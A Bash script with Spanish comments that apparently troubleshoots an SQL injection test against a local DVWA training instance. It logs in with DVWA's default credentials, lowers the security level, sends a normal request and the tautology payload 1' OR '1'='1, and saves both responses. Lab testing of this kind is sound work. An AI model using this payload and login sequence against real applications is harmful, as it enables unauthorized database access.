#!/bin/bash
#
# debug-sqli.sh - Diagnosticar problema de SQL Injection
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/utils.sh"

TARGET_URL="http://localhost:80"

echo "🔍 DIAGNÓSTICO SQL INJECTION"
echo "================================"
echo ""

# Obtener sesión
echo "[1] Obteniendo sesión DVWA..."
curl -s -c /tmp/dvwa_cookies.txt \
    -d "username=admin&password=password&Login=Login" \
    "$TARGET_URL/login.php" > /dev/null

DVWA_SESSION=$(grep PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $7}')
echo "    Sesión: $DVWA_SESSION"
echo ""

# Configurar nivel
echo "[2] Configurando nivel de seguridad a low..."
curl -s -b "PHPSESSID=$DVWA_SESSION" \
    -d "security=low&seclev_submit=Submit" \
    "$TARGET_URL/security.php" > /dev/null
echo "    ✓ Configurado"
echo ""

# Test 1: Query normal
echo "[3] Test query normal (id=1)..."
NORMAL_URL="$TARGET_URL/vulnerabilities/sqli/?id=1&Submit=Submit"
NORMAL_RESPONSE=$(curl -s -b "PHPSESSID=$DVWA_SESSION" "$NORMAL_URL")

echo "    URL: $NORMAL_URL"
echo ""
echo "--- Respuesta completa (primeras 50 líneas) ---"
echo "$NORMAL_RESPONSE" | head -50
echo ""
echo "--- Buscando 'surname' ---"
echo "$NORMAL_RESPONSE" | grep -i "surname"
echo ""

# Test 2: SQL Injection
echo "[4] Test SQL Injection (id=1' OR '1'='1)..."
SQLI_PAYLOAD="1%27%20OR%20%271%27%3D%271"
SQLI_URL="$TARGET_URL/vulnerabilities/sqli/?id=$SQLI_PAYLOAD&Submit=Submit"
SQLI_RESPONSE=$(curl -s -b "PHPSESSID=$DVWA_SESSION" "$SQLI_URL")

echo "    URL: $SQLI_URL"
echo ""
echo "--- Respuesta completa (primeras 50 líneas) ---"
echo "$SQLI_RESPONSE" | head -50
echo ""
echo "--- Buscando 'surname' ---"
echo "$SQLI_RESPONSE" | grep -i "surname"
echo ""

# Test 3: Verificar si estamos en la página correcta
echo "[5] Verificando página..."
if echo "$NORMAL_RESPONSE" | grep -q "SQL Injection"; then
    echo "    ✓ Estamos en la página SQL Injection"
else
    echo "    ✗ NO estamos en la página SQL Injection"
    echo "    Posible redirect a login"
fi
echo ""

# Test 4: Buscar títulos/indicadores
echo "[6] Buscando indicadores en la respuesta..."
echo "--- Title ---"
echo "$NORMAL_RESPONSE" | grep -i "<title>"
echo ""
echo "--- H1 ---"
echo "$NORMAL_RESPONSE" | grep -i "<h1>"
echo ""

# Test 5: Guardar HTML completo
echo "[7] Guardando HTMLs para inspección manual..."
echo "$NORMAL_RESPONSE" > /tmp/dvwa_normal.html
echo "$SQLI_RESPONSE" > /tmp/dvwa_sqli.html
echo "    Guardado en:"
echo "    - /tmp/dvwa_normal.html"
echo "    - /tmp/dvwa_sqli.html"
echo ""

echo "================================"
echo "✓ Diagnóstico completado"
echo ""
echo "Para ver los HTMLs completos:"
echo "  cat /tmp/dvwa_normal.html"
echo "  cat /tmp/dvwa_sqli.html"
